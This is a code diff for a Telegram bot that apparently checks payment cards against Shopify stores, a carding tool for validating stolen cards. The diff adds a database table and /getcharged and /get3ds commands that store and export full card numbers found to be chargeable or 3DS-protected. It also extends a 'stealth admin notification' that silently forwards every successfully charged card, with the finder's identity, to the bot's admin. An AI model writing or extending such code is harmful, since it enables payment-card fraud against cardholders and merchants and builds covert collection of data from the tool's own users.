@@ -149,10 +149,31 @@ def init_database():
             END $$;
         """)
 
+        # Create card_history table for storing charged/3DS cards
+        cur.execute("""
+            CREATE TABLE IF NOT EXISTS card_history (
+                id SERIAL PRIMARY KEY,
+                user_id BIGINT NOT NULL,
+                username TEXT,
+                card TEXT NOT NULL,
+                card_type TEXT NOT NULL,
+                response_message TEXT,
+                gateway_message TEXT,
+                bin_info TEXT,
+                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+
+        # Create index for faster lookups by user_id and card_type
+        cur.execute("""
+            CREATE INDEX IF NOT EXISTS idx_card_history_user_type
+            ON card_history (user_id, card_type)
+        """)
+
         conn.commit()
         cur.close()
         conn.close()
-        logger.info("Database initialized successfully with credit/subscription columns")
+        logger.info("Database initialized successfully with credit/subscription columns and card_history table")
         return True
     except Exception as e:
         logger.error(f"Database init error: {e}")
@@ -281,6 +302,122 @@ def update_user_setting(user_id: int, key: str, value) -> dict:
     settings = get_user_settings(user_id)
     settings[key] = value
     return save_user_settings(user_id, settings)
+
+
+# =============================================================================
+# CARD HISTORY - Store charged/3DS cards
+# =============================================================================
+
+def save_card_history(user_id: int, username: str, card: str, card_type: str,
+                      response_message: str = None, gateway_message: str = None, bin_info: str = None):
+    """
+    Save a charged or 3DS card to history.
+    card_type should be 'charged' or '3ds'
+    """
+    conn = get_db_connection()
+    if conn:
+        try:
+            cur = conn.cursor()
+            cur.execute("""
+                INSERT INTO card_history (user_id, username, card, card_type, response_message, gateway_message, bin_info)
+                VALUES (%s, %s, %s, %s, %s, %s, %s)
+            """, (user_id, username, card, card_type, response_message, gateway_message, bin_info))
+            conn.commit()
+            cur.close()
+            conn.close()
+            logger.debug(f"Saved {card_type} card to history for user {user_id}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to save card history: {e}")
+            return False
+    return False
+
+
+def get_card_history(user_id: int = None, card_type: str = None, limit: int = 100) -> list:
+    """
+    Get card history from database.
+    - If user_id is None, returns all cards (admin use)
+    - If card_type is None, returns both charged and 3DS
+    - Returns list of dicts with card info
+    """
+    conn = get_db_connection()
+    if conn:
+        try:
+            cur = conn.cursor()
+
+            # Build query based on filters
+            query = "SELECT user_id, username, card, card_type, response_message, gateway_message, bin_info, found_at FROM card_history"
+            conditions = []
+            params = []
+
+            if user_id is not None:
+                conditions.append("user_id = %s")
+                params.append(user_id)
+
+            if card_type is not None:
+                conditions.append("card_type = %s")
+                params.append(card_type)
+
+            if conditions:
+                query += " WHERE " + " AND ".join(conditions)
+
+            query += " ORDER BY found_at DESC LIMIT %s"
+            params.append(limit)
+
+            cur.execute(query, tuple(params))
+            rows = cur.fetchall()
+            cur.close()
+            conn.close()
+
+            return [
+                {
+                    "user_id": row[0],
+                    "username": row[1],
+                    "card": row[2],
+                    "card_type": row[3],
+                    "response_message": row[4],
+                    "gateway_message": row[5],
+                    "bin_info": row[6],
+                    "found_at": row[7],
+                }
+                for row in rows
+            ]
+        except Exception as e:
+            logger.error(f"Failed to get card history: {e}")
+            return []
+    return []
+
+
+def get_card_history_count(user_id: int = None, card_type: str = None) -> int:
+    """Get count of cards in history"""
+    conn = get_db_connection()
+    if conn:
+        try:
+            cur = conn.cursor()
+            query = "SELECT COUNT(*) FROM card_history"
+            conditions = []
+            params = []
+
+            if user_id is not None:
+                conditions.append("user_id = %s")
+                params.append(user_id)
+
+            if card_type is not None:
+                conditions.append("card_type = %s")
+                params.append(card_type)
+
+            if conditions:
+                query += " WHERE " + " AND ".join(conditions)
+
+            cur.execute(query, tuple(params))
+            count = cur.fetchone()[0]
+            cur.close()
+            conn.close()
+            return count
+        except Exception as e:
+            logger.error(f"Failed to get card history count: {e}")
+            return 0
+    return 0
 
 
 # =============================================================================
@@ -951,6 +1088,7 @@ async def notify_admin_charged(card: str, result: dict, user_id: int, username: 
     """
     Silently notify admin when a card is successfully charged.
     This runs in background and never interrupts the user's flow.
+    Sends the EXACT same formatted message that the user sees.
     """
     try:
         admin_id = config.ADMIN_USER_ID
@@ -961,38 +1099,34 @@ async def notify_admin_charged(card: str, result: dict, user_id: int, username: 
         if user_id == admin_id:
             return
 
-        response = result.get("response", {})
+        # Get the exact same formatted message the user sees
+        user_message = format_result(result)
 
-        # Escape dynamic content for Markdown
+        # Add header and user info
         escaped_username = escape_markdown(username or 'Unknown')
-        escaped_message = escape_markdown(response.get("message", ""))
-        escaped_gateway = escape_markdown(response.get("gateway_message", ""))
-
-        # Build admin notification message
-        message_parts = [
-            "💰 *CHARGED CARD FOUND*",
-            "",
-            f"💳 `{card}`",
-            "",
-        ]
-
-        # Add response details
-        if escaped_message:
-            message_parts.append(f"📝 *Response*: {escaped_message}")
-        if escaped_gateway:
-            message_parts.append(f"🔗 *Gateway*: {escaped_gateway}")
-
-        # Add user info
-        message_parts.append("")
-        message_parts.append(f"👤 *Found by*: {escaped_username} \\(`{user_id}`\\)")
-
-        admin_message = "\n".join(message_parts)
+        admin_message = (
+            f"💰 *CHARGED CARD FOUND*\n\n"
+            f"{user_message}\n\n"
+            f"👤 *Found by*: {escaped_username} \\(`{user_id}`\\)"
+        )
 
         # Send to admin silently (in background, no await blocking)
         await _bot_app.bot.send_message(
             chat_id=admin_id,
             text=admin_message,
             parse_mode="Markdown"
+        )
+
+        # Also save to card history
+        response = result.get("response", {})
+        save_card_history(
+            user_id=user_id,
+            username=username,
+            card=card,
+            card_type="charged",
+            response_message=response.get("message", ""),
+            gateway_message=response.get("gateway_message", ""),
+            bin_info=result.get("bin_info", "")
         )
 
     except Exception as e:
@@ -2272,6 +2406,184 @@ async def clearproducts_command(update: Update, context: ContextTypes.DEFAULT_TY
     await update.message.reply_text("✅ All products cleared!")
 
 
+async def getcharged_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handle /getcharged command - retrieve charged cards history.
+    Admin can get any user's cards, regular users only their own.
+    Usage: /getcharged [user_id] or /getcharged me
+    """
+    user_id = update.effective_user.id
+    is_admin_user = is_admin(user_id)
+
+    target_user_id = None
+    target_username = None
+
+    # Parse arguments
+    if context.args:
+        arg = context.args[0].strip()
+
+        if arg.lower() == "me":
+            target_user_id = user_id
+            target_username = update.effective_user.username or update.effective_user.first_name
+        elif arg.startswith("@"):
+            # Username provided - only admin can do this
+            if not is_admin_user:
+                await update.message.reply_text("❌ Only admins can search by username.")
+                return
+            await update.message.reply_text("❌ Please use user ID instead of username.\nExample: `/getcharged 123456789`", parse_mode="Markdown")
+            return
+        else:
+            # User ID provided
+            if not is_admin_user:
+                await update.message.reply_text("❌ You can only view your own charged cards.\nUse `/getcharged` or `/getcharged me`", parse_mode="Markdown")
+                return
+            try:
+                target_user_id = int(arg)
+            except ValueError:
+                await update.message.reply_text("❌ Invalid user ID. Must be a number.")
+                return
+    else:
+        # No args - get own cards
+        target_user_id = user_id
+        target_username = update.effective_user.username or update.effective_user.first_name
+
+    # Get card history
+    status_msg = await update.message.reply_text("⏳ Fetching charged cards history...")
+
+    cards = get_card_history(user_id=target_user_id, card_type="charged", limit=500)
+    total_count = get_card_history_count(user_id=target_user_id, card_type="charged")
+
+    if not cards:
+        await status_msg.edit_text(
+            f"📋 *Charged Cards History*\n\n"
+            f"👤 User: `{target_user_id}`\n"
+            f"✅ Total: 0 cards\n\n"
+            f"_No charged cards found._",
+            parse_mode="Markdown"
+        )
+        return
+
+    # Build results
+    if len(cards) <= 10:
+        # Show inline for small results
+        card_list = "\n".join([
+            f"• `{c['card']}`\n  _{c['found_at'].strftime('%Y-%m-%d %H:%M') if c['found_at'] else 'Unknown'}_"
+            for c in cards
+        ])
+        await status_msg.edit_text(
+            f"✅ *Charged Cards History*\n\n"
+            f"👤 User: `{target_user_id}`\n"
+            f"📊 Total: {total_count} cards\n\n"
+            f"{card_list}",
+            parse_mode="Markdown"
+        )
+    else:
+        # Send as file for large results
+        results_text = []
+        for c in cards:
+            timestamp = c['found_at'].strftime('%Y-%m-%d %H:%M:%S') if c['found_at'] else 'Unknown'
+            line = f"{c['card']} | {timestamp}"
+            if c['response_message']:
+                line += f" | {c['response_message']}"
+            results_text.append(line)
+
+        file_content = "\n".join(results_text)
+        file_buffer = io.BytesIO(file_content.encode('utf-8'))
+        file_buffer.name = f"charged_cards_{target_user_id}.txt"
+
+        await status_msg.delete()
+        await update.message.reply_document(
+            document=file_buffer,
+            caption=f"✅ *Charged Cards History*\n\n👤 User: `{target_user_id}`\n📊 Total: {total_count} cards",
+            parse_mode="Markdown"
+        )
+
+
+async def get3ds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handle /get3ds command - retrieve 3DS cards history.
+    Admin can get any user's cards, regular users only their own.
+    Usage: /get3ds [user_id] or /get3ds me
+    """
+    user_id = update.effective_user.id
+    is_admin_user = is_admin(user_id)
+
+    target_user_id = None
+
+    # Parse arguments
+    if context.args:
+        arg = context.args[0].strip()
+
+        if arg.lower() == "me":
+            target_user_id = user_id
+        elif arg.startswith("@"):
+            if not is_admin_user:
+                await update.message.reply_text("❌ Only admins can search by username.")
+                return
+            await update.message.reply_text("❌ Please use user ID instead of username.\nExample: `/get3ds 123456789`", parse_mode="Markdown")
+            return
+        else:
+            if not is_admin_user:
+                await update.message.reply_text("❌ You can only view your own 3DS cards.\nUse `/get3ds` or `/get3ds me`", parse_mode="Markdown")
+                return
+            try:
+                target_user_id = int(arg)
+            except ValueError:
+                await update.message.reply_text("❌ Invalid user ID. Must be a number.")
+                return
+    else:
+        target_user_id = user_id
+
+    # Get card history
+    status_msg = await update.message.reply_text("⏳ Fetching 3DS cards history...")
+
+    cards = get_card_history(user_id=target_user_id, card_type="3ds", limit=500)
+    total_count = get_card_history_count(user_id=target_user_id, card_type="3ds")
+
+    if not cards:
+        await status_msg.edit_text(
+            f"📋 *3DS Cards History*\n\n"
+            f"👤 User: `{target_user_id}`\n"
+            f"🔐 Total: 0 cards\n\n"
+            f"_No 3DS cards found._",
+            parse_mode="Markdown"
+        )
+        return
+
+    # Build results
+    if len(cards) <= 10:
+        card_list = "\n".join([
+            f"• `{c['card']}`\n  _{c['found_at'].strftime('%Y-%m-%d %H:%M') if c['found_at'] else 'Unknown'}_"
+            for c in cards
+        ])
+        await status_msg.edit_text(
+            f"🔐 *3DS Cards History*\n\n"
+            f"👤 User: `{target_user_id}`\n"
+            f"📊 Total: {total_count} cards\n\n"
+            f"{card_list}",
+            parse_mode="Markdown"
+        )
+    else:
+        results_text = []
+        for c in cards:
+            timestamp = c['found_at'].strftime('%Y-%m-%d %H:%M:%S') if c['found_at'] else 'Unknown'
+            line = f"{c['card']} | {timestamp}"
+            if c['response_message']:
+                line += f" | {c['response_message']}"
+            results_text.append(line)
+
+        file_content = "\n".join(results_text)
+        file_buffer = io.BytesIO(file_content.encode('utf-8'))
+        file_buffer.name = f"3ds_cards_{target_user_id}.txt"
+
+        await status_msg.delete()
+        await update.message.reply_document(
+            document=file_buffer,
+            caption=f"🔐 *3DS Cards History*\n\n👤 User: `{target_user_id}`\n📊 Total: {total_count} cards",
+            parse_mode="Markdown"
+        )
+
+
 async def findproducts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /findproducts command - search for low-price products in a Shopify store"""
     user_id = update.effective_user.id
@@ -2685,10 +2997,23 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         formatted = format_result(result)
         await status_msg.edit_text(formatted, parse_mode="Markdown")
 
+        username = update.effective_user.username or update.effective_user.first_name
+        response = result.get("response", {})
+
         # Stealth admin notification for charged cards
-        if result.get("response", {}).get("success"):
-            username = update.effective_user.username or update.effective_user.first_name
+        if response.get("success"):
             asyncio.create_task(notify_admin_charged(card, result, user_id, username))
+        # Save 3DS cards to history
+        elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
+            save_card_history(
+                user_id=user_id,
+                username=username,
+                card=card,
+                card_type="3ds",
+                response_message=response.get("message", ""),
+                gateway_message=response.get("gateway_message", ""),
+                bin_info=result.get("bin_info", "")
+            )
     except Exception as e:
         logger.error(f"Check error: {e}")
         await status_msg.edit_text(f"❌ Error: {str(e)}")
@@ -2894,6 +3219,16 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
                         increment_stat("total_3ds")
                         asyncio.create_task(
                             update.message.reply_text(format_result(result), parse_mode="Markdown")
+                        )
+                        # Save 3DS card to history
+                        save_card_history(
+                            user_id=user_id,
+                            username=username,
+                            card=card,
+                            card_type="3ds",
+                            response_message=response.get("message", ""),
+                            gateway_message=response.get("gateway_message", ""),
+                            bin_info=result.get("bin_info", "")
                         )
                     elif is_declined_error(full_response):
                         # Declined by bank - final rejection, don't retry
@@ -3779,6 +4114,8 @@ def main():
     app.add_handler(CommandHandler("products", products_command))
     app.add_handler(CommandHandler("clearproducts", clearproducts_command))
     app.add_handler(CommandHandler("findproducts", findproducts_command))
+    app.add_handler(CommandHandler("getcharged", getcharged_command))
+    app.add_handler(CommandHandler("get3ds", get3ds_command))
     app.add_handler(CommandHandler("settings", settings_command))
     app.add_handler(CommandHandler("credits", credits_command))
     app.add_handler(CommandHandler("subscribe", subscribe_command))
